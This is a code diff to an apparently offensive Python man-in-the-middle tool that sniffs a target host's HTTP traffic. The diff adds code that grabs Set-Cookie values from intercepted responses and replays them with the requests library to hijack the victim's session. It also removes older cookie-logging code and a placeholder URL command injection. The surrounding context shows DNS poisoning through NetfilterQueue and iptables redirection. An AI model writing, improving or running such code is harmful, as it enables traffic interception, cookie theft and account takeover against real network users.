@@ -10,7 +10,7 @@ import os
 import platform
 import ctypes
 import subprocess
-import re
+import requests
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -80,31 +80,13 @@ class Device:
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
-
-                # Capture and print cookies
-                if "Cookie:" in raw_data:
-                    cookies = re.findall(r"Cookie: (.+?)\r\n", raw_data)
-                    if cookies:
-                        print(f"{Fore.GREEN}[Captured Cookie]: {cookies[0]}{Style.RESET_ALL}")
-
-                # Capture and print Set-Cookie headers
-                if "Set-Cookie:" in raw_data:
-                    cookies = re.findall(r"Set-Cookie: (.+?)\r\n", raw_data)
-                    if cookies:
-                        print(f"{Fore.RED}[Captured Set-Cookie]: {cookies[0]}{Style.RESET_ALL}")
-
-                # Inject command or data into HTTP GET/POST requests
-                if "GET" in raw_data or "POST" in raw_data:
+                if "POST" in raw_data or "GET" in raw_data:
                     if "Host:" in raw_data and "GET" in raw_data:
                         try:
                             host = raw_data.split("Host: ")[1].split("\r\n")[0]
                             path = raw_data.split("GET ")[1].split(" HTTP")[0]
                             url = f"http://{host}{path}"
                             print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
-                            
-                            # Inject a malicious parameter into the URL
-                            injected_url = f"{url}?cmd=malicious_command"
-                            print(f"{Fore.YELLOW}Injected URL: {injected_url}{Style.RESET_ALL}")
                         except Exception:
                             pass
 
@@ -116,6 +98,17 @@ class Device:
                                 if '=' in line and len(line) < 100:
                                     print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
+                    # Capture cookies
+                    if "Set-Cookie:" in raw_data:
+                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+                        
+                        # Session hijacking attempt (basic)
+                        session = requests.Session()
+                        session.cookies.set('session', cookies)
+                        response = session.get(url)
+                        print(f"{Fore.CYAN}Hijacked Session Response: {response.status_code} {url}{Style.RESET_ALL}")
+                        
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
@@ -129,9 +122,8 @@ class Device:
         print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')
 
     def dns_poison(self, spoof_ip):
-        # Import NetfilterQueue only when DNS poisoning is selected
-        from netfilterqueue import NetfilterQueue
-
+        import netfilterqueue  # Import only when DNS poisoning is needed
+        
         def dns_pkt_callback(pkt):
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -141,7 +133,8 @@ class Device:
                 send(spoofed_pkt, iface=self.iface, verbose=False)
                 print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ip}{Style.RESET_ALL}')
         
-        nfqueue = NetfilterQueue()
+        # Set up NFQUEUE for DNS packets
+        nfqueue = netfilterqueue.NetfilterQueue()
         nfqueue.bind(0, dns_pkt_callback)
         print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
         nfqueue.run()
